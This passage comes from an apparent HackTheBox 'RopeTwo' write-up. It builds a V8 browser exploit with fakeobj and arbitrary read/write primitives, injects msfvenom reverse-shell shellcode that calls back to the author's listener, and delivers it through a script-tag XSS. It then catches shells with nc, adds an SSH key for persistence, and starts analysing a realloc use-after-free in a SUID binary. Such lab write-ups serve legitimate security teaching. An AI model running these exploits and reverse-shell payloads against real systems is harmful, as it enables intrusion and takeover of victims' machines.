fakeobj is another exploit primitive that is the inverse of addrof. If addrof lets me find out the address of an object, fakeobj lets let create an object anywhere in memory and then read from and write to it. I’ll set the address into place while `arr` is a float array, and then switch it to an object array. Now the first half of the double I wrote will be handled as a compressed pointer, so I can get that object and return it. I’ll also set `arr` back to a float array before returning.

```

function fakeobj(addr) {
    arr[0] = itof(addr);
    arr.SetLastElement(itof(obj_array_map));
    let fake = arr[0];
    arr.SetLastElement(itof(float_array_map));
    return fake;
}

```

#### arbread

With these two primitives, I can now create an arbitrary read function, arbread. I’ll start by creating another floats array, but this time, the first element will be the float array map (and properties). I can look at the memory involved here (I’ve labeled the memory in that last dump):

```

d8> var arr2 = [itof(float_array_map),1.1, 2.2, 3.3];
undefined
d8> %DebugPrint(arr2)
0x08750808692d <JSArray[4]>
[4.73859563718219e-270, 1.1, 2.2, 3.3]
d8> ^C
Thread 1 "d8" received signal SIGINT, Interrupt.
__GI___libc_read (nbytes=0x400, buf=0x55be0d8e3eb0, fd=0x0) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
gef➤  x/16xw 0x08750808692d-1-0x30
0x875080868fc:  0x00000000      0xfffffffe      0x08040a3d      0x00000008 <-- ?, ?, FixedArray map, len
0x8750808690c:  0x08241909      0x080406e9      0x9999999a      0x3ff19999 <-- [0] == map + props, [1] == 1.1
0x8750808691c:  0x9999999a      0x40019999      0x66666666      0x400a6666 <-- [2] == 2.2, [3] == 3.3
0x8750808692c:  0x08241909      0x080406e9      0x08086905      0x00000008 <-- JSArray map, prop, elements, length

```

Next, I’ll create a fake object located at `addrof(arr2) - 0x20`. This lines up with the 0 element, which I’ve already started setting up to contain a map and properties. I’ll set the 1 element to be eight bytes before the address I want to read, and the length to 1 (so 2):

```

d8> arr2[1] = itof((2n<<32n) + 0x808694dn - 8n)
4.3105762977e-314
d8> ^C
Thread 1 "d8" received signal SIGINT, Interrupt.
__GI___libc_read (nbytes=0x400, buf=0x55be0d8e3eb0, fd=0x0) at ../sysdeps/unix/sysv/linux/read.c:26
26      in ../sysdeps/unix/sysv/linux/read.c
gef➤  x/16xw 0x08750808692d-1-0x30
0x875080868fc:  0x00000000      0xfffffffe      0x08040a3d      0x00000008
0x8750808690c:  0x08241909      0x080406e9      0x08086945      0x00000002 <-- fake map, props, elements, len
0x8750808691c:  0x9999999a      0x40019999      0x66666666      0x400a6666
0x8750808692c:  0x08241909      0x080406e9      0x08086905      0x00000008

```

Now if I read `fake[0]`, it will return the double located at 0x808694d (minus 1 for pointers):

```

d8> ftoi(fake[0]).toString(16)
"208040975"
d8> ^C
Thread 1 "d8" received signal SIGINT, Interrupt.
__GI___libc_read (nbytes=0x400, buf=0x55be0d8e3eb0, fd=0x0) at ../sysdeps/unix/sysv/linux/read.c:26
26      in ../sysdeps/unix/sysv/linux/read.c
gef➤  x/xg 0x8750808694c
0x8750808694c:  0x0000000208040975

```

I’ll add that as a clean function to my `exploit.js` file:

```

var arr2 = [itof(float_array_map), 1.1, 2.2, 3.3];
var fake = fakeobj(addrof(arr2)-0x20n);

function arbread(addr) {
    if (addr % 2n == 0) {
        addr += 1;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    return (fake[0]);
}

```

#### arbwrite

To do an arbitrary write, I’ll do the same thing, setting the fake object’s elements array address and then setting the 0 element (as opposed to reading it):

```

function arbwrite(addr, val) {
    if (addr % 2n == 0) {
        addr += 1;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    fake[0] = itof(BigInt(val));
}

```

### v8 Exploit

With the primitives I need in place, generate the exploit, continuing along in [Faith’s oob-v8 writeup](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) with the WebAssembly Technique.

#### Create RWX Segment

I’m planning to write some shellcode to memory and then execute it. In order to do this, I’ll need a RWX memory segment, and WebAssembly is a way to do that. I’ll yank the code right from Faith’s post:

```

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

```

Checking the fiddle page in the comment, I can see that this code is just the web assembly for:

```

int main() { 
  return 42;
}

```

#### Find Segment

I’ll need a way to find the start of the the segment. I’ll start by re-running the the new wasm lines added to `exploit.js`, and then I’ll drop to `gdb` and run the GEF command `vmmap` to list all the segments:

```

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path                                 
0x00000bed00000000 0x00000bed0000c000 0x0000000000000000 rw-
0x00000bed0000c000 0x00000bed00040000 0x0000000000000000 ---
0x00000bed00040000 0x00000bed00041000 0x0000000000000000 rw-
0x00000bed00041000 0x00000bed00042000 0x0000000000000000 ---
0x00000bed00042000 0x00000bed00052000 0x0000000000000000 r-x
0x00000bed00052000 0x00000bed0007f000 0x0000000000000000 --- 
0x00000bed0007f000 0x00000bed00080000 0x0000000000000000 ---
0x00000bed00080000 0x00000bed00081000 0x0000000000000000 rw-
0x00000bed00081000 0x00000bed00082000 0x0000000000000000 ---
0x00000bed00082000 0x00000bed000bf000 0x0000000000000000 r-x
0x00000bed000bf000 0x00000bed08040000 0x0000000000000000 ---
0x00000bed08040000 0x00000bed0805d000 0x0000000000000000 r--
0x00000bed0805d000 0x00000bed08080000 0x0000000000000000 ---
0x00000bed08080000 0x00000bed0818d000 0x0000000000000000 rw-
0x00000bed0818d000 0x00000bed081c0000 0x0000000000000000 ---
0x00000bed081c0000 0x00000bed081c1000 0x0000000000000000 rw-
0x00000bed081c1000 0x00000bed08200000 0x0000000000000000 ---
0x00000bed08200000 0x00000bed08280000 0x0000000000000000 rw-
0x00000bed08280000 0x00000bee00000000 0x0000000000000000 ---
0x00002c3409915000 0x00002c3409916000 0x0000000000000000 rwx
0x000055eff7124000 0x000055eff740b000 0x0000000000000000 r-- /home/df/v8/out.gn/x64.release/d8      
0x000055eff740b000 0x000055eff800a000 0x00000000002e6000 r-x /home/df/v8/out.gn/x64.release/d8
...[snip]...

```

Right before the segments for `d8` itself there’s a rwx segment, in this case at 0x00002c3409915000.

Back in `db` (`c` from `gdb`), I can get the address of `wasm_instance` using `%DebugPrint`:

```

d8> %DebugPrint(wasm_instance)
0x0bed08210e65 <Instance map = 0xbed08244901>
[object WebAssembly.Instance]

```

Back in `gdb`, I’ll dump a bunch of memory starting at `wasm_instance`, and the address of that segment is in there, at an offset of 0x68:

```

gef➤  x/16gx 0x0bed08210e65-1
0xbed08210e64:  0x080406e908244901      0x20000000080406e9
0xbed08210e74:  0x0001000000007f38      0x0000ffff00000000
0xbed08210e84:  0x0000006000000000      0x080406e900000bed
0xbed08210e94:  0x000055eff9ac3200      0x00000000080406e9
0xbed08210ea4:  0x0000000000000000      0x0000000000000000
0xbed08210eb4:  0x0000000000000000      0x000055eff9ac3220
0xbed08210ec4:  0x00000bed00000000      0x00002c3409915000 <-- address of rwx memory
0xbed08210ed4:  0x08086f6508086e09      0x08210e4d08200f51

```

#### Write Shellcode to Segment

I’ll use the same code from Faith’s post to write shellcode into this page, and then call `f()`:

```

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x14n;
    arbwrite(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

var shellcode=[0xcccccccc];
console.log("[*] Copying shellcode tp rwx page")
copy_shellcode(rwx_page_addr, shellcode);
console.log("[*] Executing shellcode...");
f();

```

The offset from the ArrayBuffer to the backing store changed from 0x20 to 0x14 (pointer compression). I can find that with the debug version of `d8`:

```

df@buntu:~/v8$ gdb -q out.gn/x64.debug/d8 
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 9.2 using Python engine 3.8
Reading symbols from out.gn/x64.debug/d8...
gef➤  run --allow-natives-syntax --shell                                                     
Starting program: /home/df/v8/out.gn/x64.debug/d8 --allow-natives-syntax --shell
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7f09e2100700 (LWP 67750)]
V8 version 8.5.0 (candidate)                                                                 
d8> var buf = new ArrayBuffer(8);
undefined                    
d8> %DebugPrint(buf);        
DebugPrint: 0x935080c5e29: [JSArrayBuffer]
 - map: 0x093508281189 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0935082478c1 <Object map = 0x935082811b1>
 - elements: 0x0935080406e9 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2    
 - backing_store: 0x555ab153a820
...[snip]...
d8> ^C
Thread 1 "d8" received signal SIGINT, Interrupt.
__GI___libc_read (nbytes=0x400, buf=0x555ab15c0180, fd=0x0) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
gef➤  x/12xw 0x935080c5e29-1
0x935080c5e28:  0x08281189      0x080406e9      0x080406e9      0x00000008
0x935080c5e38:  0x00000000      0xb153a820      0x0000555a      0xb159dc30 <-- backing store at 0x14
0x935080c5e48:  0x0000555a      0x00000002      0x00000000      0x00000000

```

For now, I’ll let the shellcode be four 0xCC, which is the [INT3](https://en.wikipedia.org/wiki/INT_(x86_instruction)#INT3) instruction that sets a breakpoint. If I hit this code, `gdb` will break. When I run this, it does!

```

gef➤  run --allow-natives-syntax exploit.js --shell
Starting program: /home/df/v8/out.gn/x64.release/d8 --allow-natives-syntax exploit.js --shell
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7fd766778700 (LWP 67784)]
[*] Creating WASM RWX page
[+] Found pointer to wasm_instance: 0x82112bd
[+] Found address of rwx page: 0x3937f5d78000
[*] Copying shellcode tp rwx page
[*] Executing shellcode...

Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
0x00003937f5d78001 in ?? ()

```

The RIP is at 0x00003937f5d78001, and the leaked rwx page address is 0x3937f5d78000, so that’s a hit!

#### Weaponize Shellcode

Next I need to put real shellcode in. I’ll start with a payload that will get a reverse shell from my Ubuntu dev VM back to my Kali VM on my local nextwork. `msfvenom` has the payload format `dword`, which I can use to get the shellcode in a format I can drop into `exploit.js`:

```

root@kali# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.1.1.140 LPORT=443 -f dword
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 76 bytes
Final size of dword file: 232 bytes
0x9958296a, 0x6a5f026a, 0x050f5e01, 0xb9489748, 0xbb010002, 0x8c01010a, 0xe6894851, 0x6a5a106a, 
0x050f582a, 0x485e036a, 0x216aceff, 0x75050f58, 0x583b6af6, 0x2fbb4899, 0x2f6e6962, 0x53006873, 
0x52e78948, 0xe6894857, 0x0000050f

```

Start `nc` on kali and update `exploit.js`. Now I’ll run it in `d8`:

```

gef➤  run --allow-natives-syntax exploit.js --shell
Starting program: /home/df/v8/out.gn/x64.release/d8 --allow-natives-syntax exploit.js --shell
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7f05e643e700 (LWP 67861)]
[*] Creating WASM RWX page
[+] Found pointer to wasm_instance: 0x82112a5
[+] Found address of rwx page: 0x8ac78c42000
[*] Copying shellcode tp rwx page
[*] Executing shellcode...
[Thread 0x7f05e643e700 (LWP 67861) exited]
process 67857 is executing new program: /usr/bin/dash

```

It hangs here, but at `nc`, there’s a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.1.1.163.
Ncat: Connection from 10.1.1.163:40672.
id
uid=1000(df) gid=1000(df) groups=1000(df),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),998(vboxsf)
hostname
buntu

```

I could also run it outside of `gdb`, which is a good check to make sure I removed any `%DebugPrint` calls, which will fail without `--allow-natives-syntax`:

```

df@buntu:~/v8$ out.gn/x64.release/d8 exploit2.js 
[*] Creating WASM RWX page
[+] Found pointer to wasm_instance: 0x82112a5
[+] Found address of rwx page: 0x215ea6e9d000
[*] Copying shellcode tp rwx page
[*] Executing shellcode...

```

#### Remote Shellcode

I’ll do the same thing, this time with my HTB Tun0 IP:

```

root@kali# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f dword
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 76 bytes
Final size of dword file: 232 bytes
0x9958296a, 0x6a5f026a, 0x050f5e01, 0xb9489748, 0xbb010002, 0x0e0e0a0a, 0xe6894851, 0x6a5a106a, 
0x050f582a, 0x485e036a, 0x216aceff, 0x75050f58, 0x583b6af6, 0x2fbb4899, 0x2f6e6962, 0x53006873, 
0x52e78948, 0xe6894857, 0x0000050f

```

I’ll update `exploit.js`. The final full version is [here](/files/ropetwo-pwn-v8.js).

### Find XSS

With an exploit for the vulnerable browser, I need some way to get the user on RopeTwo to load JavaScript from my host. I went back to `/contact` on port 8000. I had tried some basic XSS attempts during initial enumerations (like sending a link to be clicked) without luck. But here I want their browser to load script from me, so I tried a script tag:

```

<script src="http://10.10.14.14/script.js"></script>

```

With `nc` listening, a request arrived:

```

root@kali# nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.196.
Ncat: Connection from 10.10.10.196:48812.
GET /script.js HTTP/1.1
Host: 10.10.14.14
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4157.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

Looks like I have a way to get RopeTwo to load script.

### Shell

I’ll combine all this to get a shell. I’ll start a Python HTTP server to serve `exploit.js`, and start a `nc` listener. Then I’ll submit:

![image-20201115074354796](https://0xdfimages.gitlab.io/img/image-20201115074354796.png)

At `nc`, a shell connects:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.196.
Ncat: Connection from 10.10.10.196:58812.
id
uid=1001(chromeuser) gid=1001(chromeuser) groups=1001(chromeuser)

```

And upgrade my shell:

```

python3 -c 'import pty;pty.spawn("bash")'
chromeuser@rope2:/home/chromeuser/web$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
chromeuser@rope2:/home/chromeuser/web$

```

I’ll also add my public SSH key to the chromeuser’s `authorized_keys` file for SSH access.

## Priv: chromeuser –> r4j

### Enumeration

There’s not anything in chromeuser’s home directory except for the web stuff used to get a shell. There’s a second user on the box, r4j. chromeuser can’t access r4j’s home directory, but I did go looking for files owned by r4j:

```

chromeuser@rope2:/$ find / -user r4j -ls 2>/dev/null | grep -v -e " \/proc" -e " \/sys"
  1056436     16 -rwsr-xr-x   1 r4j      r4j         14312 Feb 24  2020 /usr/bin/rshell
  1054404      4 drwx------   7 r4j      r4j          4096 Nov 24 15:30 /home/r4j
        2      0 drwx------   4 r4j      r4j           100 Nov 24 14:44 /run/user/1000
        9      0 crw--w----   1 r4j      tty        136,   6 Nov 24 15:30 /dev/pts/6

```

I’m immediately drawn to `/usr/bin/rshell`, as not only is it owned by r4j, but it’s SUID, so if I can exploit it, I’ll be running as r4j.

### rshell Overview

#### Running It

On running the program, I’m dropped to a prompt:

```

chromeuser@rope2:/$ rshell
$ id
uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)
$ whoami
r4j

```

It’s a bit of a troll, because running `id` or `whoami` will give the impression that I just got a shell as r4j. But on trying other commands, it’s clear that this isn’t a normal shell:

```

$ pwd
rshell: pwd: command not found
$ cd /
rshell: cd /: command not found

```

#### Main Loop

I opened it in [Ghidra](https://ghidra-sre.org/) to take a look. On searching for the string “command not found”, I landed in the function at 0x1019be, which I’ll name `process_input`. The function that calls this function is 0x101b93, which I’ll call `main_loop`:

```

void main_loop(void)

{
  ssize_t i;
  long in_FS_OFFSET;
  undefined in_buf [200];
  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init_stuff();
  memset(in_buf,0,200);
  do {
    do {
      printf("$ ");
      i = read(0,in_buf,199);
    } while ((int)i < 2);
    in_buf[(int)i + -1] = 0;
    process_input(in_buf);
  } while( true );
}

```

It initializes some stuff, and then enters an infinite loop, printing `$` , reading in up to 200 characters, null terminating the input, and passing it to `process_input`, which takes action based on the first few characters in the input:

| Input Starts With | Action |
| --- | --- |
| “ls “ | call `do_ls` [0x1015cf] |
| “add “ | calls `do_add(user_input[4:])` [0x101345] |
| “rm “ | calls `do_rm(user_input[3:])` [0x10166d] |
| “echo “ | prints back the rest of the string |
| “edit “ | calls `do_edit(user_input[5:])` [0x1017d8] |
| “whoami” | prints “r4j” |
| “id” | prints “uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)” |
| Anything else | prints “rshell: %s: command not found” |

#### Commands

The program keeps up to two “files” at a time, where file1 on is a global at 0x104060, and file2 is at 0x104130. For each file, the first eight bytes contain a pointer to a heap buffer created by `malloc` of a user provided size containing the file contents. There is a check that only allows sizes less than or equal to 0x70 bytes. The last 0xC8 (200) bytes hold the name of the file. The `add` function ensures that a second file cannot have the same name as an existing file, and that no more than two files can be added. This will be the biggest constraint in exploiting this binary, as it’s quite difficult to manipulate the heap to where you want it with only two files at a time.

The `ls` command loops over the two slots, and if the pointer is non-null, it will print the name of the file. It does not print any contents, and there’s no way to legitimately get the contents of a file, which provides another major hurdle to overcome in exploitation.

The `rm` command loops over the two slots looking at the string at offset eight, and if the string matches the input, the it sets the string filename to all null, frees the heap memory with the contents, and sets the pointer to null.

The `edit` command is where the vulnerability exists.

```

void do_edit(char *param_1)

{
  int strcmp_res;
  long in_FS_OFFSET;
  uint read_size;
  int i;
  void *new_buf;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  i = 0;
  do {
    if (1 < i) {
      puts("rshell: No such file or directory");
LAB_001019a8:
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    strcmp_res = strcmp(param_1,(char *)((long)i * 0xd0 + 0x104068));
    if ((strcmp_res == 0) && ((&item_array)[(long)i * 0x1a] != 0)) {
      read_size = 0;
      printf("size: ");
      __isoc99_scanf("%u",&read_size);
      getchar();
      if (read_size < 0x71) {
        new_buf = realloc((void *)(&item_array)[(long)i * 0x1a],(ulong)read_size);
        if (new_buf == (void *)0x0) {
          puts("Error");
        }
        else {
          *(void **)(&item_array + (long)i * 0x1a) = new_buf;
          printf("content: ");
          read(0,(void *)(&item_array)[(long)i * 0x1a],(ulong)read_size);
        }
      }
      else {
        puts("Memory Error!");
      }
      goto LAB_001019a8;
    }
    i = i + 1;
  } while( true );
}

```

This loop first checks if `i` is greater than 1, which indicates that it’s looped through both configs and not found a matching file to edit, in which case it prints an error message and exits. It then checks the current item to see if the name matches the input, and if so, it prompts for a new size (ensuring that it’s less than 0x71), and uses `realloc` on the existing buffer. Then it reads in and stores the content, and completes.

### Configuration

#### Exploit Script

To interact with this binary, I’ll use a handful of tools. First, I’ll start a Python exploit script. To start, it will just have methods to interact with the various commands in `rshell` (this script presumes that my ssh public key is in the `authorized_keys` file for chromeuser):

```

#!/usr/bin/env python3

import pdb
from pwn import *

prompt = '$ '

def ls():
    p.sendline('ls')
    res = p.recvuntil(prompt)
    for line in res.split(b'\n')[:-1]:
        print(line.decode())

def add(name, size, content='x'):
    p.sendline(f'add {name}')
    res = p.recvuntil(('size: ', prompt))
    if res.endswith(prompt.encode()): 
        pdb.set_trace()
        return
    p.sendline(f'{size}')
    if size > 0:
        p.recvuntil('content: ')
        p.sendline(content)
    res = p.recvuntil(prompt)
    return res 
    
def rm(name, wait=True):
    p.sendline(f'rm {name}')
    if wait:
        p.recvuntil(prompt)

def edit(name, size, content='x'):
    p.sendline(f'edit {name}')
    res = p.recvuntil(('size: ', prompt))
    if res == prompt: 
        pdb.set_trace()
        return
    p.sendline(f'{size}')
    if size > 0:
        p.recvuntil('content: ')
        p.send(content)
    p.recvuntil(prompt)

rshell = ELF('./rshell')
libc = ELF('./libc.so.6-ropetwo')

if args.REMOTE:
    remote = ssh(host='10.10.10.196', user='chromeuser', keyfile='/root/keys/ed25519_gen')

if args.REMOTE:
    p = remote.run('rshell')
else:
    p = process('./rshell')
p.recvuntil('$ ')
x=1

```

#### Libc

I’ll want to use the same `libc` that is being used on RopeTwo:

```

chromeuser@rope2:~$ ldd /usr/bin/rshell 
        linux-vdso.so.1 (0x00007fff8515b000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc977190000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc97738a000)

```

I’ll use `scp` to get both `libc.so.6` (which I’ll name `libc.so.6-ropetwo` on my host) and `ld-linux-x86-64.so.2`.

I’ll want debug symbols for `libc`, so I’ll use the same process I used in [PlayerTwo](/2020/06/27/htb-playertwo.html#fix-heapinfo):

```

root@kali# wget https://answers.launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb
...[snip]...
root@kali# dpkg --fsys-tarfile libc6-dbg_2.29-0ubuntu2_amd64.deb | tar xOf - ./usr/lib/debug/lib/x86_64-linux-gnu/libc-2.29.so > libc-2.29.so
root@kali# eu-unstrip libc.so.6-ropetwo libc-2.29.so
root@kali# mv libc-2.29.so{,-debug}

```

Now I’ll use `patchelf` to tell `rshell` to use these:

```

root@kali# patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./rshell
root@kali# patchelf --replace-needed libc.so.6 ./libc-2.29.so-debug  ./rshell            

```

The local `rshell` is using these two libraries:

```

root@kali# ldd rshell 
        linux-vdso.so.1 (0x00007ffff7fd0000)
        ./libc-2.29.so-debug (0x00007ffff7dd7000)
        ./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd2000)

```

#### gdb

For initial development, I turned of ASLR on my host by running `echo 0 > /proc/sys/kernel/randomize_va_space`. This will allow me to put a break where I want it without having to adjust each time.

To track the heap I used [Pwngdb](https://github.com/scwuaptx/Pwngdb) (not to be confused with [pwndbg](https://github.com/pwndbg/pwndbg)). The `heapinfo` command prints a nice view of the various freed bins.

Putting all of this together, I created the following init file for `gdb`:

```

set pagination off
b *0x0000555555555c2b
command 1
echo -----------------------------------\n
set $cont1p = *((long int*)0x555555558060)
set $cont1 = *(char[]*)$cont1p
set $name1 = *(char[]*) 0x555555558068
printf "[0x%08x%08x] %-8s: %s\n", $cont1p >> 32, $cont1p, $name1, $cont1
set $cont2p = *((long int*)0x555555558130)
set $cont2 = *(char[]*)$cont2p
set $name2 = *(char[]*) 0x555555558138
printf "[0x%08x%08x] %-8s: %s\n", $cont2p >> 32, $cont2p, $name2, $cont2
echo -----------------------------------\n
x/48xg 0x55555555c2f0
echo -----------------------------------\n
heapinfo
continue
end

```

This will set a breakpoint at 0xc2b, which is before the next command is read. At this break point, it will figure out the name and content for both files, and print the results. It will then print 48 words from the heap in the area I’m most working (I did modify this address as I was focused on different parts of the heap). Finally it will run `heapinfo` to show the bins. Then it will continue. In this way, I can step through the Python script and run functions from there, and the `gdb` window will continue to print the status after each command.

I did comment out the sourcing of [Peda](https://github.com/longld/peda) in my `~/.gdbinit` file because I couldn’t get it to stop printing the context on each break, which bumped all this info I was printing off the screen.

#### Putting It Together

Now I’ll start the Python script with the Python debugger (`pdb`) set to stop on that last line so I can continue to run commands after:

```

root@kali# python3 -mpdb -c 'b 58' -c c pwn_rshell.py 
Breakpoint 1 at /media/sf_CTFs/hackthebox/ropetwo-10.10.10.196/pwn_rshell.py:58
[*] '/media/sf_CTFs/hackthebox/ropetwo-10.10.10.196/rshell'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/media/sf_CTFs/hackthebox/ropetwo-10.10.10.196/libc.so.6-ropetwo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './rshell': pid 16061
> /media/sf_CTFs/hackthebox/ropetwo-10.10.10.196/pwn_rshell.py(58)<module>()
-> x = 1
(pdb)

```

Now in another pane I’ll attach `gdb`, and then tell it to continue:

```

root@kali# gdb -q -p $(pidof rshell) --command=gdb-rshell.init
Attaching to process 16061
Reading symbols from /media/sf_CTFs/hackthebox/ropetwo-10.10.10.196/rshell...
(No debugging symbols found in /media/sf_CTFs/hackthebox/ropetwo-10.10.10.196/rshell)
Reading symbols from ./libc-2.29.so-debug...
Reading symbols from ./ld-linux-x86-64.so.2...
(No debugging symbols found in ./ld-linux-x86-64.so.2)
0x00007ffff7eebf81 in __GI___libc_read (fd=0, buf=0x7fffffffdf90, nbytes=199) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
Breakpoint 1 at 0x555555555c2b
(gdb) c
Continuing.

```

When I add a file:

```

(Pdb) add('test', 0x60, 'this is a test') 

```

`gdb` updates:

```
-----------------------------------
[0x000055555555c260] test    : this is a test
[0x0000000000000000]         : (null)
-----------------------------------
0x55555555c250: 0x0000000000000000      0x0000000000000071 <-- heap meta
0x55555555c260: 0x2073692073696874      0x000a747365742061 <-- string contents
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000000
0x55555555c290: 0x0000000000000000      0x0000000000000000
0x55555555c2a0: 0x0000000000000000      0x0000000000000000
0x55555555c2b0: 0x0000000000000000      0x0000000000000000
0x55555555c2c0: 0x0000000000000000      0x0000000000020d41
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000000000
0x55555555c300: 0x0000000000000000      0x0000000000000000
0x55555555c310: 0x0000000000000000      0x0000000000000000
0x55555555c320: 0x0000000000000000      0x0000000000000000
0x55555555c330: 0x0000000000000000      0x0000000000000000
0x55555555c340: 0x0000000000000000      0x0000000000000000
0x55555555c350: 0x0000000000000000      0x0000000000000000
0x55555555c360: 0x0000000000000000      0x0000000000000000
0x55555555c370: 0x0000000000000000      0x0000000000000000
0x55555555c380: 0x0000000000000000      0x0000000000000000
0x55555555c390: 0x0000000000000000      0x0000000000000000
0x55555555c3a0: 0x0000000000000000      0x0000000000000000
0x55555555c3b0: 0x0000000000000000      0x0000000000000000
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
-----------------------------------
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555c2c0 (size : 0x20d40) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0

```

### Comment

This exploit was crazy to develop. Every time I got to the next step, I had to go back and completely rearchitect the previous one, moving around blocks, trying different size bins. It would be impossible for me to show all these steps in this post, but rather, I’ll try to walk through the different goals accomplished in the finished script and show how the script is used to manipulate the heap to do what I need. But it’s worth adding that the first time I got a libc address onto the heap, my code looked totally different. When I got to the next step, I would use the same general techniques, but I needed to completely rework the spacing and sizing of the different bins to accomplish both the goals I’d already achieved and the next one.

### Vulnerability

#### Description

The vulnerability here is with `realloc` in the `edit` command, and how it reacts based on the current size and the new size:

| Size Comparison | Action |
| --- | --- |
| new\_size == 0 | `free(buffer)`, return null |
| new\_size > 0 && new\_size < orig\_size | Break into two chunks, returning same address with smaller chunk, and leaving free chunk at end of old chunk |
| new\_size > 0 && new\_size > orig\_size | Free old chunk, allocate a new chunk for larger size, and return that address. |

The code above checks if the return is null, but then just prints a message and doesn’t change the stored pointer. This leaves the user with a pointer into freed memory, which is bad.

#### Example

To see this, I’ll run the following:

```

(Pdb) add('1', 0x50)
(Pdb) add('2', 0x50)
(Pdb) rm('1')
(Pdb) edit('2', 0)

```

That leaves the following (`<--` added by me):

```
-----------------------------------
[0x0000000000000000]         : (null)
[0x000055555555c2c0] 2       : `UUUU                        <-- still have pointer to chunk2
-----------------------------------
0x55555555c250: 0x0000000000000000      0x0000000000000061  <-- freed chunk 1
0x55555555c260: 0x0000000000000000      0x000055555555c010  <-- tcache pointer null, key
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000000
0x55555555c290: 0x0000000000000000      0x0000000000000000
0x55555555c2a0: 0x0000000000000000      0x0000000000000000
